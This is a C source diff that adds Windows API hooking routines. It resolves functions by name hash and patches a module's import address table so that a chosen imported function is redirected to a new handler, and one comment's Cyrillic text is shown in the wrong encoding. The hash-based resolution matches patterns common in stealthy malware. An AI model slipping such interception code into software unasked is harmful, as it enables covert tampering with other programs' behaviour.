@@ -3,6 +3,7 @@
 #include "Memory.h"
 #include "GetApi.h"
 #include "zdisasm.h"
+#include "strings.h"
 
 
 void GetInstLenght(DWORD* myiptr0, DWORD* osizeptr);
@@ -176,16 +177,16 @@ PVOID HookApi( DWORD Dll, DWORD FuncHash, LPVOID ReplacementFunc )
 PVOID HookApi( DWORD Dll, DWORD FuncHash, LPVOID ReplacementFunc, PVOID FuncReal )
 {
 	DWORD FuncAddr = (DWORD)GetProcAddressEx(NULL, Dll, FuncHash );
-/*
-	if( FuncAddr )
-		pOutputDebugStringA( "1" );
-	else
-		pOutputDebugStringA( "0" );
-*/
 	*((DWORD*)FuncReal) = (DWORD)__HookApi(Dll, FuncAddr, (DWORD)ReplacementFunc);
 	return FuncReal;
 }
 
+PVOID HookApi( const char* DllName, DWORD FuncHash, LPVOID ReplacementFunc, PVOID FuncReal )
+{
+	DWORD FuncAddr = (DWORD)GetProcAddressEx( (char*)DllName, 0, FuncHash );
+	*((DWORD*)FuncReal) = (DWORD)__HookApi(0, FuncAddr, (DWORD)ReplacementFunc);
+	return FuncReal;
+}
 
 /************************************************************************/
 //* ѕерехватывает Ќ≈экспортируемую функцию из dll по еЄ VA адресу,     *//
@@ -200,4 +201,71 @@ PVOID HookApi2( DWORD Dll, DWORD FuncVA, DWORD ReplacementFunc )
 	}
 	else
 		return NULL;
+}
+
+static PIMAGE_NT_HEADERS GetNtHeaders(PVOID Image)
+{
+  PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(  ((PIMAGE_DOS_HEADER)Image)->e_lfanew +  (PCHAR)Image );
+  if ( 	((PIMAGE_DOS_HEADER)Image)->e_magic != IMAGE_DOS_SIGNATURE )
+	  return NULL;
+  if ( pNtHeader->Signature != IMAGE_NT_SIGNATURE )
+	  return NULL;
+  return pNtHeader;
+};
+
+bool PathIAT(PVOID Module,PCHAR DllName,PCHAR FuncName,PVOID NewHandler,PVOID *OldHandler)
+{
+
+	PIMAGE_NT_HEADERS		pNtHeader;
+	PIMAGE_DATA_DIRECTORY	pData;
+	CHAR buf1[MAX_PATH];
+
+	if ( Module == NULL )
+		return false;
+
+	pNtHeader = GetNtHeaders(Module);
+	if ( pNtHeader == NULL )
+		return false;
+
+	pData = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+	if ( pData->Size == 0 )
+		return false;
+	
+	m_lstrcpy(buf1,DllName);
+	pCharUpperBuffA(buf1,sizeof(buf1)-1);
+
+	PIMAGE_IMPORT_DESCRIPTOR	pimg_import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((PCHAR)Module + pData->VirtualAddress);
+
+	for ( int i =0; pimg_import_desc[i].Name != 0; ++i)
+	{
+		CHAR buf2[MAX_PATH];
+		PCHAR ImortDll = (PCHAR)Module + pimg_import_desc[i].Name;
+		m_lstrcpy(buf2,ImortDll);
+		pCharUpperBuffA(buf2,sizeof(buf2)-1);
+		if ( m_lstrcmp(buf1,buf2) != 0 )
+			continue;
+
+		DWORD  VAToThunk   = pimg_import_desc[i].FirstThunk;
+		PDWORD FirstThunk  = (PDWORD)((PCHAR)Module + pimg_import_desc[i].FirstThunk);  /*VA to function*/
+		PDWORD OriginalFirstThunk  =(PDWORD)((PCHAR)Module + pimg_import_desc[i].OriginalFirstThunk); /*VA to name function*/
+		while ( *FirstThunk  && *OriginalFirstThunk )
+		{
+			PCHAR Name  = (PCHAR)((PCHAR)Module +*OriginalFirstThunk ); 
+			Name+=2;
+
+			if ( m_lstrcmp(Name,FuncName) == 0)
+			{
+				DWORD Protect;
+				*OldHandler = (PVOID)*FirstThunk;
+				pVirtualProtect(FirstThunk,sizeof(PVOID),PAGE_READWRITE,&Protect);
+				*FirstThunk = (DWORD)NewHandler;
+				pVirtualProtect(FirstThunk,sizeof(PVOID),Protect,&Protect);
+				return true;
+			}
+
+			FirstThunk++;	OriginalFirstThunk++;
+			VAToThunk += sizeof(VAToThunk);
+		}
+	}
+	return false;
 }
